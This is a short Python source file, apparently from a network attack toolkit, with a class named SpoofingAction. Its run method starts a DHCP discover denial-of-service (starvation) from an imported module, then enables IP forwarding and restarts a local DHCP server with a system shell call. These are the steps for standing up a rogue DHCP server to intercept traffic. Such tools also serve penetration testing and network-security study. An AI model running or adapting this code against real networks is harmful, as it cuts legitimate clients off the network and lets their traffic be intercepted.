from os import system


class SpoofingAction:

    env = None
    DHCPModel = None

    def __init__(self,Environement):
        self.env = Environement
        self.DHCPModel = self.env.getImport('DHCP')

    def run(self):
        print('\033[1m' + '[*] SpoofingAction running. It will try to spoof the DHCP.\n' + '\033[0m')
        self.DHCPModel.DHCP_Discover_Dos()
        system('sysctl net.ipv4.ip_forward=1 && systemctl restart dhcpd4')
